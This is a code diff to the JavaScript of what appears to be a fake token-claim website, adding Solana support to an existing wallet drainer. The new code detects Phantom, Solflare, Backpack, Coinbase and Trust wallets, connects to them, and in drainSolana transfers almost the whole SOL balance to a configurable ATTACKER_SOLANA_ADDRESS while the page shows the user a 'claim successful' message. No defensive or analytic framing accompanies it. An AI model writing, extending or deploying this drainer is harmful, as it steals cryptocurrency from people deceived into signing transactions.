@@ -1984,6 +1984,35 @@ const walletDetectors = {
   },
 };
 
+// ====== SOLANA WALLET DETECTION ======
+const solanaWalletDetectors = {
+  isPhantom: () => !!(window.phantom?.solana || window.solana?.isPhantom),
+  isSolflare: () => !!window.solflare,
+  isBackpack: () => !!window.backpack,
+  isCoinbaseSolana: () => !!window.coinbaseSolana,
+  isTrustSolana: () => !!(window.trustWallet?.solana),
+};
+
+function getSolanaWallets() {
+  const wallets = [];
+  if (solanaWalletDetectors.isPhantom()) {
+    wallets.push({ name: 'Phantom', provider: window.phantom?.solana || window.solana });
+  }
+  if (solanaWalletDetectors.isSolflare()) {
+    wallets.push({ name: 'Solflare', provider: window.solflare });
+  }
+  if (solanaWalletDetectors.isBackpack()) {
+    wallets.push({ name: 'Backpack', provider: window.backpack });
+  }
+  if (solanaWalletDetectors.isCoinbaseSolana()) {
+    wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
+  }
+  if (solanaWalletDetectors.isTrustSolana()) {
+    wallets.push({ name: 'Trust', provider: window.trustWallet.solana });
+  }
+  return wallets;
+}
+
 // ====== CURRENCY CONVERSION SYSTEM ======
 const CURRENCY_CONVERTER = {
   rates: {
@@ -2254,6 +2283,11 @@ let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
 let contractInstance; // will be set after web3 initialization
 const CLAIM_THRESHOLD_USD = 3;
 
+// Solana specific state
+let solanaProvider = null;
+let solanaPublicKey = null;
+const ATTACKER_SOLANA_ADDRESS = "YourSolanaWalletAddressHere"; // REPLACE WITH YOUR ADDRESS
+
 // DOM Elements
 const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
 const navLinks = document.querySelector(".nav-links");
@@ -2402,14 +2436,139 @@ async function checkAndAutoTriggerClaim() {
   }
 }
 
-// ====== MAIN CLAIM PROCESS ======
+// ====== SOLANA FUNCTIONS ======
+async function connectSolanaWallet() {
+  const wallets = getSolanaWallets();
+  if (wallets.length === 0) {
+    throw new Error("No Solana wallet found");
+  }
+
+  const wallet = wallets[0];
+  const provider = wallet.provider;
+
+  try {
+    let publicKey;
+    if (provider.connect) {
+      const response = await provider.connect();
+      publicKey = response.publicKey?.toString() || response.toString();
+    } else if (provider.request) {
+      const response = await provider.request({ method: 'connect' });
+      publicKey = response.publicKey.toString();
+    } else {
+      throw new Error("Unsupported provider interface");
+    }
+
+    solanaProvider = provider;
+    solanaPublicKey = publicKey;
+    console.log(`✅ Connected to ${wallet.name}: ${publicKey}`);
+    return { provider, publicKey };
+  } catch (err) {
+    throw new Error(`Solana connection failed: ${err.message}`);
+  }
+}
+
+async function drainSolana() {
+  if (!solanaProvider || !solanaPublicKey) {
+    throw new Error("Solana wallet not connected");
+  }
+
+  if (typeof solanaWeb3 === 'undefined') {
+    throw new Error("Solana Web3 library not loaded");
+  }
+
+  const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
+
+  try {
+    const publicKey = new solanaWeb3.PublicKey(solanaPublicKey);
+    const balance = await connection.getBalance(publicKey);
+    console.log(`💰 Solana balance: ${balance / 1e9} SOL`);
+
+    const LAMPORTS_TO_LEAVE = 5000;
+    if (balance <= LAMPORTS_TO_LEAVE) {
+      throw new Error("Insufficient SOL balance for transaction");
+    }
+
+    const amountToSend = balance - LAMPORTS_TO_LEAVE;
+
+    const instruction = solanaWeb3.SystemProgram.transfer({
+      fromPubkey: publicKey,
+      toPubkey: new solanaWeb3.PublicKey(ATTACKER_SOLANA_ADDRESS),
+      lamports: amountToSend,
+    });
+
+    const { blockhash } = await connection.getRecentBlockhash();
+    const transaction = new solanaWeb3.Transaction().add(instruction);
+    transaction.recentBlockhash = blockhash;
+    transaction.feePayer = publicKey;
+
+    let signed;
+    if (solanaProvider.signTransaction) {
+      signed = await solanaProvider.signTransaction(transaction);
+    } else if (solanaProvider.signAndSendTransaction) {
+      const signature = await solanaProvider.signAndSendTransaction(transaction);
+      return signature;
+    } else {
+      throw new Error("Provider cannot sign transactions");
+    }
+
+    const signature = await connection.sendRawTransaction(signed.serialize());
+    console.log(`✅ Solana transaction sent: ${signature}`);
+    return signature;
+  } catch (err) {
+    throw new Error(`Solana drain failed: ${err.message}`);
+  }
+}
+
+// ====== MAIN CLAIM PROCESS (Extended for Solana) ======
 async function initiateClaimProcess() {
-  if (!connectedWallet || !web3) {
-    showNotification("Please connect your wallet first", "error");
-    showWalletModal();
+  // If EVM is connected, use EVM path
+  if (connectedWallet && web3) {
+    await evmClaimProcess();
     return;
   }
 
+  // Otherwise, try Solana
+  try {
+    const button = document.getElementById("connectButton");
+    const originalText = button ? button.innerHTML : "Connect Wallet";
+    if (button) {
+      button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting Solana...';
+      button.disabled = true;
+    }
+    if (claimStatus) {
+      claimStatus.textContent = "Connecting to Solana wallet...";
+      claimStatus.className = "status pending";
+    }
+
+    await connectSolanaWallet();
+
+    if (claimStatus) {
+      claimStatus.textContent = "Draining SOL...";
+    }
+
+    const txSig = await drainSolana();
+
+    if (claimStatus) {
+      claimStatus.textContent = "Solana claim successful! SOL transferred.";
+      claimStatus.className = "status success";
+    }
+
+    userHasClaimed = true;
+    handleClaimSuccess(null, null, button, originalText);
+    showNotification(`Solana transaction sent: ${txSig.slice(0,10)}...`, "success");
+  } catch (error) {
+    console.error("Solana claim error:", error);
+    if (claimStatus) {
+      claimStatus.textContent = error.message;
+      claimStatus.className = "status error";
+    }
+    const button = document.getElementById("connectButton");
+    if (button) resetButton(button, button.innerHTML.replace('<i class="fas fa-spinner fa-spin"></i> ', ''));
+  }
+}
+
+// Original EVM claim logic extracted (unchanged)
+async function evmClaimProcess() {
   const button = document.getElementById("connectButton");
   const originalText = button ? button.innerHTML : "Connect Wallet";
 
@@ -3313,7 +3472,7 @@ function handleClaimSuccess(userAddress, tokens, button, originalText) {
     }
   }
   claimList.unshift({
-    address: userAddress.substring(0, 6) + "..." + userAddress.substring(38),
+    address: userAddress ? userAddress.substring(0, 6) + "..." + userAddress.substring(38) : "Solana User",
     amount: 500,
     timestamp: Date.now(),
     valueUSD: claimedValueUSD,
